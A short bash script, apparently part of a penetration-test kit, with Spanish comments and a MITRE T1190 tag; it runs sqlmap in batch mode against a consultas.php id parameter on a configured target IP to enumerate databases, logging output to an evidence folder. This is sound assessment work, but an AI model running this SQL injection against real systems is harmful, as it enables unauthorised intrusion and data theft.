#!/usr/bin/env bash
source "$(dirname "$0")/../config.sh"
echo "[T1190] Inyección SQL contra consultas.php en $TARGET_IP"
echo "Ajusten el parámetro ?id=1 al real de la app una vez que D la confirme."
sqlmap -u "http://$TARGET_IP/consultas.php?id=1" --batch --dbs \
  | tee "../evidencia/03_sqlmap_$(date +%Y%m%d_%H%M).log"
